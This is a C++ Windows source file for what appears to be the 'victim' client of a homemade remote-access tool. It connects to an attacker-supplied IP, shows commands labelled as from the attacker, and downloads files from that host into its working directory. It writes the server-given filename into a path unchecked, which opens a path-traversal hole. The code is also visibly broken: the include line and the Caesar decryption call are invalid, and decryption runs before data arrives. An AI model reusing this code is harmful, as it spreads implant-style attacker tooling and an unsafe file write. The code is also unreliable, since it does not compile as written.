#include <winsock2.h>
#include <iostream>
#include <ws2tcpip.h>
#include <cstdint>
#include "menu.h"
#include <direct.h>
#include <"Encryption-Techniques/CaesarCipherShift.h">

int main(int argc, char* argv[]) {
    if(argc < 2) {
        std::cout << ERROR_PREFIX << " Incorrect usage, please use: \033[32m./victim IP\033[0m" << std::endl;
        return 1;
    }
    sockaddr_in serverAddress;
    WSADATA wsa;
    char buffer[BUFFERSIZE];
    SOCKET sock = INVALID_SOCKET;

    if(WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { //ver 2.2
        std::cout << ERROR_PREFIX << " WSAStartup failed\n";
        return 1;
    } else {
        std::cout << SUCCESS_PREFIX << " WSAStartup created\n";
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == INVALID_SOCKET) {
        std::cout << ERROR_PREFIX << " Socket failed\n";
        WSACleanup();
        return 1;
    } else {
        std::cout << SUCCESS_PREFIX << " Socket created\n";
    }

    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(PORT);
    
    std::string serverip = argv[1];

    if(inet_pton(AF_INET, serverip.c_str(), &serverAddress.sin_addr) <= 0) {
        std::cout << ERROR_PREFIX << " Invalid IP address\n";
        return 1;
    }

    if(connect(sock, (sockaddr*) &serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
        std::cout << ERROR_PREFIX << " Connection failed\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    } else {
        std::cout << SUCCESS_PREFIX << " Connection established\n";
    }

    while(true) {
        int type;
        int bytesRec = recv(sock, (char*)&type, sizeof(type), 0);
        if(bytesRec <= 0) {
            std::cout << SERVER_STATUS_CLOSED;
            break;
        }

        if(type == TYPE_TEXT) {
            memset(buffer, 0, BUFFERSIZE);

            bytesRec = recv(sock, buffer, BUFFERSIZE, 0);
            if(bytesRec <= 0) {
                std::cout << SERVER_STATUS_CLOSED;
                break;
            }
            std::string cmd(buffer);
            std::cout << ATTACKER_LABEL << cmd << std::endl;

            std::string clientMessage = std::string(CONSOLE_PREFIX) + " Client received: " + cmd + "\n";
            send(sock, clientMessage.c_str(), clientMessage.size(), 0);
        
        }
        
        if(type == TYPE_FILE) {
            int64_t fileSize;
            bytesRec = recv(sock, (char*)&fileSize, sizeof(fileSize), 0);
            if(bytesRec < 0 || fileSize < 0) {
                std::cout << ERROR_PREFIX << " Cannot receive file information\n";
                continue;
            }

            int32_t fileNameLeng;
            bytesRec = recv(sock, (char*)&fileNameLeng, sizeof(fileNameLeng), 0);
            if (bytesRec <= 0) {
                std::cout << ERROR_PREFIX << " Cannot receive file name length\n";
                continue;
            }

            char* fileNameBuffer = new char[fileNameLeng + 1];
            bytesRec = recv(sock, fileNameBuffer, fileNameLeng, 0);
            fileNameBuffer[fileNameLeng] = '\0';
            std::string filename(fileNameBuffer);
            delete[] fileNameBuffer;

            char c[BUFFERSIZE];
            _getcwd(c, sizeof(c));
            std::string path = std::string(c) + "\\" + filename;
            std::cout << SUCCESS_PREFIX << " Received file: '" << filename << "'" << std::endl;
            std::cout << PENDING_PREFIX << " Saving file to: " << path << std::endl;

            FILE* fileOutput = fopen(path.c_str(), "wb");
            if(!fileOutput) {
                std::cout << ERROR_PREFIX << " Cannot create file\n";
                continue;
            }
        
            int64_t dataRec = 0;
            while (dataRec < fileSize) {
                int receive = (fileSize - dataRec > BUFFERSIZE) ? BUFFERSIZE : (fileSize - dataRec);

                // decrypt
                caesarDecrypt(char buffer, bytesRec);

                bytesRec = recv(sock, buffer, receive, 0);
                if (bytesRec <= 0) {
                    break;
                }
                fwrite(buffer, 1, bytesRec, fileOutput);
                dataRec += bytesRec;
                std::cout << SUCCESS_PREFIX << " Saved file to: " << path << std::endl;
            }

            fclose(fileOutput);
        }

        if(type == TYPE_EXIT) {
            std::cout << SERVER_STATUS_CLOSED;
            break;
        }
    }
    closesocket(sock);
    WSACleanup();
    return 0;
}